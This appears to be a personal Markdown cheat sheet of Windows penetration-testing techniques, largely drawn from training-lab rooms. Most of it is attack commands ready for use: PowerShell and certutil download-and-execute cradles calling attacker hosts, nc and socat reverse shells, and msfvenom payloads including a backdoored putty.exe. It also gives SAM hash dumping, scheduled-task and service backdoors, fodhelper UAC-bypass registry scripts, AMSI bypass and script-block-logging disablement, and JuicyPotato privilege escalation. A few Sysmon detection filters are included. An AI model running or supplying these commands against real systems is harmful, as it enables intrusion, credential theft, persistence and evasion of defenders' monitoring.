
- [Sysinternals](#sysinternals)
  - [Tools](#tools)
  - [Abusing Internals](#abusing-internals)
  - [Commands](#commands)
  - [Windows: get file](#windows-get-file)
    - [Connecting with nc](#connecting-with-nc)
  - [Enumerate](#enumerate)
  - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
    - [Tampering with low users](#tampering-with-low-users)
    - [Dump hashs](#dump-hashs)
    - [crackmapexec](#crackmapexec)
    - [Backdoor](#backdoor)
    - [Create/Modfiy Services](#createmodfiy-services)
    - [Schedule Tasks](#schedule-tasks)
    - [Logon as Trigger](#logon-as-trigger)
    - [Login Screen](#login-screen)
    - [Web shell | mssql](#web-shell--mssql)
  - [Powershell](#powershell)
    - [Enumeration](#enumeration)
  - [SMB - 445](#smb---445)
    - [SMBMAP](#smbmap)
- [RDP](#rdp)
- [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
  - [GUI bypass](#gui-bypass)
  - [Auto Elevating](#auto-elevating)
  - [Enviroment Variable](#enviroment-variable)
- [Runtime Detection](#runtime-detection)
- [Evade Logging](#evade-logging)
- [Living Off the Land](#living-off-the-land)
  - [File Operation](#file-operation)
    - [Certutil](#certutil)
    - [BITSAdmin](#bitsadmin)
    - [FindStr](#findstr)
    - [Execution](#execution)
- [Bypass Applocker](#bypass-applocker)
  - [Privilege Escalation](#privilege-escalation)
    - [Incognito](#incognito)
    - [Potato family](#potato-family)


## Sysinternals
- [LOLBAS](https://lolbas-project.github.io/#)
- [Where Download](https://learn.microsoft.com/en-us/sysinternals/downloads/)
- [Where Download 2](https://live.sysinternals.com/)
- Download
  - Install WebDAV
    - get-service webclient && start-service webclient ==> run webclient
    - control.exe /name Microsoft.NetworkAndSharingCenter ==> turn on network discovery
    - Install-WindowsFeature WebDAV-Redirector -Restart
    - Get-WindowsFeature WebDAV-Redirector | Format-Table -Autosize
  - Run
    - net use * \\live.sysinternals.com\tools\procmon.exe
  - \\live.sysinternals.com\tools\procmon.exe

```
# Troubeshoot

- services.msc + enable:
  - DNS Client
  - Function Discovery Resource Publication
  - SSDP Discovery
  - UPnP Device Host
```

### Tools
- Process analyser
  - Procmon, Process Explorer, Process Hacker 2
- DLL
  - library with code and data shared by programs
  - modularization of code
  - code reuse
  - better memory usage
  - Dependency ==> target of hijacking/injection
  - Load?
    - *load-time dynamic*: calls to the dll (with header and import)
    - *run-time dynamic link*: separte function 
  
- PE = Portable Executable
  - .exe files

- Internals
  - Win64 API
  - interaction with memory
  - user x kernel mode ==> API call = Switching Point

- ASLR = Address Space Layout Randomization 

- **Sigcheck**
  - file version number
  - -u: VirusTotal
  - -e: image
  
- **Streams**
  - Downloaded file
  - streams Path\To\File --acepteula
  - get-item -path Path\to\file -stream * || get-content
  - file.txt:streamName.txt
  
- **SDelete**
  - Secure delete

- **TCPView**
  - all tcp and udp endpoints = resmon (Resource Monitor)
  
- **Autoruns**
  - autostart apps/scripts
  
- **ProcDump**
  - monitor cpu spikes + crash dumps
  - extract credentials from process
  - create dump ==> also with process explorer
  - procdump -ma PROCESS 
  - alternative: Out-Minidump
  
- **Process Explorer**
  - actice process + handles or dll
  - agent process, properties and threads
  - procexp
  
- **Process Monitor**
  - file system, registry and process/thread history
  - procmon
  
- **PsExec**
  - like telnet
  - psexec (psexec -accepteula -i -s cmd.exe)
  - psexec \\IP -accepteula -i -s DOMAIN\User run_smt
  - psexec \@hostname. -accepteula -i -s DOMAIN\User run_smt
  
- **Sysmon**
  - event log: process, network, file change and creation
  - [Config File](https://github.com/SwiftOnSecurity/sysmon-config)
  - Get-WinEvent | wevutil.exe 
  - Filter: Get-WinEvent
    - */System/EventID=ID
    - */EventData/Data[@Name="<XML Attribute/Name>"]
    - *EventData/Data=Data
    - Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'
    - *LSASS* = Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="TargetImage"] and */EventData/Data="C:\Windows\system32\lsass.exe"'
    - *Malware*= Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=<Port>'
    - *Persistence* = Binary / app in the startup
    - *RegKey* = Modifications in registry
    - *Evasion* = 
  
- **WinObj**
  - NT Object Manager name space

- **BgInfo**
  - Sysinfo
- **RegJump**
  - RegJump Registry/Path
  - = reg query = Get-Item = Get-ItemProperty
- **Strings**
  - scan for UNICODE or ASCI

### Abusing Internals
- [Abusing Internals](https://tryhackme.com/room/abusingwindowsinternals)
- Basic steps
  - Open process
  - Allocate memory
  - write malicious code
  
- Injector
- hollowing - unmapping process
- Hijacking
- DLL
- Invoke function pointers
- Asynchronous procedure calls
- Section manipulation

- [Malware hook](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)

### Commands
- powershell -exec bypass
- powershell -ep bypass
- systeminof
  - part of Active Directory (workgroup / domain)
- wmic = Windows Management Instrumentation Command-line
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
  - wmic service where "name like 'name'" get Name,Version,Pathname
  - **wmic** find users || dir /p datei.txt (find file) = find file
  - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    - find services not in folder c:\windows
    - find services without quotation marks
    - account for the service: sc qc SERVICE_NAME ==>local syste?

- Find 
  - get-Process -Name
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - Force
    - Recurse
    - Error
  - Test-NetConnection 

- Get-CimInstance
  - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender
  - Open Ports:
    - netsh advfirewall firewall add rule name="ALLOW TCP PORT 80" dir=in action=allow protocol=TCP localport=80
    - netsh advfirewall firewall show rule name="ALLOW TCP PORT 80"
  
- whoami 
  - /priv
  - /groups

- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - -l = listening
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - -Force
    - -Recurse
    - -Path
    - -Include *.EXtension*
    - -File
    - -ErrocAction
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

- findstr = grep
- 
### Windows: get file
  - powershell iex (New-Object Net.WebClient).DownloadString('http://IP:PORT/Invoke-name.ps1'); Invoke-name -Reverse -IPAddress your-ip -Port your-port
    - C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.XX.XX/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 

  - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://Attcker/File
  
  - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://Attcker/File', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')" = Load the script
  
  - iex(New-Object Net.WebClient).DownloadString("http://10.9.1.255:80/PowerUp.ps1")dir

  - powershell -c wget "http://Attcker/File -outfile "PowerUp.ps1"

  - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
  
  - copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')

#### Connecting with nc
- nc.exe TARGET PORT -e cmd.exe
### Enumerate

- **Check permisions**
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
  -  setspn -T medin -Q ​ */* 
- Invoke Kereberosast script:
  - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
  
### Stabilize / Post Exploit / Persistance windows

#### Tampering with low users
- Create user + add group admin
  - **net user USERNAME PASS /add**
  - **net localgroup {Administrators/"Backup Operators"| "Remote Management Users" | "Remote Desktop Users"} Username /add**
  
- User Account Control
  - Less privilege when logged in remotly
  -  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

- Assign BACKUP OPERATOR groups
  - secedit /export /cfg config.inf
    - SeBackupPrivilege
    - SeRestorePrivilege
    - secedit /import /cfg config.inf /db config.sdb
    - secedit /configure /db config.sdb /cfg config.inf

- Allow winRM
  - Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

- Change registry values
  - defauld admin RID = 500
  - Regular users RID >= 1000 ==> Find hex
  - wmic useraccount get name,sid
  - PsExec64.exe -i -s regedit
  - In: HKLM\SAM\SAM\Domains\Account\Users\
    - Change in F to value of admin in HEX(little endian)

#### Dump hashs
reg.exe save hklm\sam C:\path\to\save\sam.save
reg.exe save hklm\security C:\path\to\save\security.save
reg.exe save hklm\system C:\path\to\save\system.save

python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL

#### crackmapexec
- crackmapexec smb <target-ip> -u username -p password -M spider_plus
cat /tmp/cme_spider_plus/<target-ip>.json
- crackmapexec smb $target -u Administrator -p 123456 -x COMMAND_TO_EXECUTE
- crackmapexec smb $target -u users.txt -p pass.txt
- crackmapexec smb $target -u user -p pass --rid-brute
  - brute force SID - Security Identifier = find users

- [crackmapexec](https://www.crackmapexec.wiki/)


#### Backdoor
- find executables and "batizar"
  - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.11.26.251 lport=4444 -b "\x00" -f exe -o puttyX.exe
  - msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
- shortcut
  - point the shortcut to payload

- File association
  - HKLM\Software\Classes ==> reference to standard program = script to be loaded

#### Create/Modfiy Services
- **Create**
  - sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
  - sc.exe start THMservice
  - create service with msfvenom:
    - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
  
- **Modify**
  - sc.exe query state=all
    - sc.exe qc ServiceName
  - Important:
    - binary path name
    - start_type (auto)
    - start name (better localsystem)
    - lsmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
  - upload and edit:
    - sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
    - sc.exe qc THMservice3

#### Schedule Tasks
- schtasks
  - schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
- Hidding the task
  - remove Security Descriptor
    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
  -  PsExec64.exe -s -i regedit
  -  Delete task

#### Logon as Trigger
- **Executable on startup**
  - Folder User: AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  - Folge ALL: ProgramData\Windows\Start Menu\Programs\Startup

- **RunOnce**
  - Force run via registry
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
  - HKCU = current user
  - HKLM = All users
  - Run = logon
  - RunOnce = singletime
  - Create registry entry
    - REG_EXPAND_SZ in HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  
- **WinLogn**
  - Executed after authentication
  - HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
  - Userinit ==> userinit.exe = user profile preferences

- **Logon Scripts**
  - Only for current user
  - Variable: UserInitMprLogonScript
  - Assign logon script to user
  - HKCU\Environment ==> add Reg_Expand_Sy

#### Login Screen
- Sticky keys
  - 5 x shift = C:\Windows\System32\sethc.exe
  - take ownershipf of file + give permision + overwrite sethc,exe
    - takeown /f c:\Windows\System32\sethc.exe
    - icalcs c:\Windows\System32\sethc.exe /grant Administrator:F

- Utilman (patched)
  - Ease access 
  - c:\Windows\System32\sethc.exe

#### Web shell | mssql
- web shell to web directory
- default web server: iis apppool\defaultapppool

### Powershell
- .NET framkework: software plattform für windows
- Commands = cmdlets
  - Verb-Noum
  - Get
  - Start
  - Stop
  - Read
  - Write
  - New
  - Out
- Get-Help [cmdlet] = display info
- Get-Command
  - Verb-*
  - *-Npin
  - New.*
  
- Pipelines |
  - objects are passed
  - Verb-Noum | get-Member => Info about cmdled, object (properties and methods)
    - -MemberType Method/Property/ScriptProperty
  
- Properties
  - COMMAND | Get-Member -MemberType Methody,Property,Other

- Manipulate
  - Select-Object -Property
  - Where-Object => grep
    - -Property PropertyName -operator Value
    -  {$_.PropertyName -operator Value}
       -  -Property Status -eq Running
    -  -operator
       -  -Contains
       -  -EQ
       -  -GT
 - Sort-Object
- Find FIle
  - Get-ChildItem -Recurse -Path "C:\" | Where-Object {$_.Name -match 'interesting*'}
    - -Recurse
    - -Force
    - -Hidden
    - -Path
    - -ErrorAction
    - -Include "\*.EXT\*"
  - Select-String 
    -  -Pattern API_KEY
  
- Measure-Object = count
- Oldest -MaxEvent 1
- Base64
  - certutil.exe -decode INPUT_FILE OUTPUT_FILE
  - Encode: 
    - $Input = Textblablabla
    - $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    - $EncodedText =[Convert]::ToBase64String($Bytes)
    - $EncodedText
  - Decode
    - $ENCODED = Get-Content -Path "C:\Users\Administrator\Desktop\b64.txt"  
  -  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
  
#### Enumeration
- COMMAND | get-member
- Get-LocalUser = show users
  - Where-Object {$_.SID -match 'S-1-5-21-1394777289-3961777894-1791813945-501'}
  - Get-LocalUser | Select-Object -Property Name,Enabled,SID
  - Get-LocalUser | Where-Object {$_.PasswordRequired -match 'False' } | measure-object
  
- Get-Localgroup
- Network
  - get-NetIPAddress
  - Get-NetTCPConnection 
  - Test-NetConnection
  - Invoke-WebRequest
    - curl in powershell
    - Remove-Item alias:curl = to use curl and not invoke
- Patches
  - Get-HotFix
- Scheduled-Task
  - Get-ScheduledTask
- Owner
  - Get-Acl

### SMB - 445
- Server Message BLock
- share of files on the network
- Commands
  - smbmap -H $target = Check Privileges 
  - smbmap -H $target -R --depth 5
  - smbclient -L //$target -U admin/administrator
  - smbclient -L //$target/ = List Shares
  - smbclient //$target/Users = Interactive shell to a share 
  - smbclient  \\\\$target\\share$ = Open a Null Session
  - smbclient //friendzone.htb/general -U "" = see files inside
  - smbclient -N -L //$target/ = List Shares as Null User
  - smbmap -u Administrator -p 'Password@1' -H $target
  - smbclient -U 'administrator%Password@1' \\\\\$target\\c$
  - Nmap scripts
    - smb-enum-users.nse
    - smb-os-discovery
    - smb-protocols
    - smb-enum-shares
    - smb-vuln*

- Scripts
  - smb-enum*
  - smb-vuln*

- Transfer files
  - On attacking maching
    - smbserver.py share .
    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
  - On target
    - net use \\AttackingIP\share
    - net use x: \\IP\share /user:USER PASS = send to drive X:
    - copy \\IP\\share\file.ext = fetch file
    - 
    - smbclient -U USER '//IP/folder'
    - put file.name
    - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD

- Use impacket
```
# create server
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password 1234567

# Connect to the SMB server
net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 

# retrieve the files on the share
copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe

# Disconnect server
net use \\ATTACKER_IP\share /del
```

- **enum4linux**

#### SMBMAP
- Default
  - smbmap -H $target
  
- Enumerate
  - -u USERNAME
  - -r DiskName
    - smbmap -H $target -r DiskName
  - -u USER -H $target -r /ShareNAME/Folder
  - -u "" -p "" = Null section
  - -x COMMANDS
- Download

  - smbmap -u USER -H $target -r /ShareNAME/Folder ---download /Path/to/file
- Options
  - -H: host
  - -r: path
  - -u: User
  - -p: password

## RDP
- Basic login
  - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
  - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share


- Mount local folder:
  - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 

## Bypass User Account Control (UAC)
- New Process are runned as non-privileged-account
- Tokens
  - Normal user: 1
  - Admin: filtered (norma actions) + elevated (admin actions)
- Bypass ==> goint to elevated to IL (integrity level) high
- References
- [UAC git repository](https://github.com/hfiref0x/UACME)
- [Bypassing UAC](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
- [Way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)


[**Automated bypass**](https://github.com/hfiref0x/UACME)

### GUI bypass
- **msconfig** RUNS with IL high
    - shell from msconfing = high
- **azman.msc** ==> help ==> view source = open ==> all files

### Auto Elevating
- manifest ==> autoElevate (on/off)
- Change default programm execution in HKEY_Current_USer
  
```
# Define standard application
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

# Link the application to attacker programm
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"

# Make the system used our choue
reg add %REG_KEY% /v "DelegateExecute" /d "" /f

# Add the created command as preference
reg add %REG_KEY% /d %CMD% /f

# execute fodhelper.exe

### After Windows Defender

set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

# Set command + Query = register delete, windows defender did not act so quickly
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% & fodhelper.exe

# Clean Steps
reg delete HKCU\Software\Classes\ms-settings\ /f
```

- Variations use other registry keys
```
# Powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force

Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force

Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# CMD
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

# Clean Steps:
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

### Enviroment Variable
- Task scheduler
- Rewrite Variable %windir% ==> HKCU\Environment
  - Add at the end = "&REM " = comment everything that exist after the variable name
  
```
# Payload to be executed instead of normal scheduled task
cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%

# Adding the new registry
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# Cleanup new entries
reg delete "HKCU\Environment" /v "windir" /f
```

## Runtime Detection
- Scan code before execution
  - directly from memory
- CRL = Common Language Runtime
- DLR = Dynamic Language Runtime
- [Amsi Fail](http://amsi.fail/)

- How
  - Donwgrade powershell
  - Powershell -Version 2
  
```
https://github.com/trustedsec/unicorn

full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

- **Reflection**
```
# Reflection to modify and bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 1 - use assembly from Ref.Assembly
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# 2 - obtain .net assembly for PSEtwLogProvider, piped from the previous part of the command
.GetField('amsiInitFailed','NonPublic,Static')

# 3 - set field m_enabled do previous stored value
.SetValue($null,$true)
```

## Evade Logging
- Methodology
  - disable logging (1)
  - keep integrity (2)
  - clear logs (3)

- Logs are forwarded from endpoints to central device
- just deleting them may raise alerts
- Append to a .ps1 script

- **Check amount registered log entries - (2)**
```
Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count

# Check Event Viewer
Microsoft/Windows/PowerShell/Operational 
```

- **Reflection - (1)**
```
# obtain .net assembly for PSEtwLogProvider
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

# store null value for etwProvider
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

# set field m_enabled do previous sotred value
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

 **Group Policy Takeover**
```
# Reflection to obtaim SM and identify GPO
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

# modify event provider to 4104 to 0  
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

# 4103
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

- **Disable Logging in ps session**
  - Append to script OR execute in session
  - Avoid sending logs to the pipeline

```
# Get target module
$module = Get-Module Microsoft.PowerShell.Utility 

# module execution details = false
$module.LogPipelineExecutionDetails = $false

# Get target ps-snapin
$snap = Get-PSSnapin Microsoft.PowerShell.Core

# Set ps-snapin execution details to false
$snap.LogPipelineExecutionDetails = $false
```

## Living Off the Land
- Using and abusing of what exists
- How
  - Reconnaissance
  - Files operations
  - Arbitrary code execution
  - Lateral movement
  - Security product bypass

### File Operation

#### Certutil
- certification services
- dump + diplay certfication authority
- Ingress tool transfer
- Download
  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
- Encode / Decode
  - certutil -encode payload.exe Encoded-payload.txt
  - certutil -decode Encoded_file payload.txt

#### BITSAdmin
- create,download, upload Background Intelligente Transfer Service (BITS = files from http and smb servers)
- bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe

#### FindStr
- grep
- used to download from SMB
  - findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

#### Execution
- Indirect command execution
- **File Explorer**
  - explorer.exe /root,"C:\Windows\System32\calc.exe"
- 
- **WMIC**
  - wmic.exe process call create calc
  
- **Rundll32**
  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(123)
  -  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP:PORT/script.ps1');");

- **Regsvr32**
  - system32 = 32 bit
  - SysWOW64 = 64 bits
  - Execute binaries + bypass whitelistening
  - Steps
    1. create malicious dll: msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
    2. upload the file
    3. run it: regserv32.exe c:\path\to\file
    4. regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll 
       1. /s = silent
       2. /n = not call DLL register server
       3. /i = Use another server
       4. /u = run unregistered

- **WSL**
  - bash.exe -c "c:/path/to/file"

- **Shortcuts**
  - Target: rundll32, Powershell, Regsvr32.
  - [Atomic-red-team-T1023](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)

- **No Powershell**
  - [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
  - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
  - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
  - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj

## Bypass Applocker
- Applocker: restrict programs from being executed
- Windows 7 default
  - whitelisted directory
    - C:\Windows\System32\spool\drivers\color
- Windows history:
  - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

### Privilege Escalation
- Check privileges
	- [Privileges options](https://hackersploit.org/windows-privilege-escalation-fundamentals/)
- Check potatos
	- [Potato family](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
	- [Incognito.exe](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)

- **JUICYPOTATO**
  - extract CLSID
  - .\JuicyPotato.exe -p SCRIPT.bat -l 1234 -t * -c [{CLSID}](https://ohpe.it/juicy-potato/CLSID/)
  - msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.87 LPORT=1234 -f exe -o privesc.exe

#### Incognito
[Tips](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)

- .\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
- .\incognito.exe list_tokens -u

- Create user with admin:
  
```
.\incognito add_user NAME PASS
.\incognito add_localgroup_user Administrators NAME
```

#### Potato family
- [More info](https://0xaniket.medium.com/tryhackme-retro-walkthrough-b1197c3c05fb)
- Privilege **SeImpersonatePrivilege** and/or **SeAssignPrimaryTokenPrivilege**
- JuicyPotato
	- [releases](https://github.com/ohpe/juicy-potato/releases)
	- juicypotato.exe -l PORT -p REVSHELL.exe -t * -c {[FIND_CLSID](https://ohpe.it/juicy-potato/CLSID/)]}
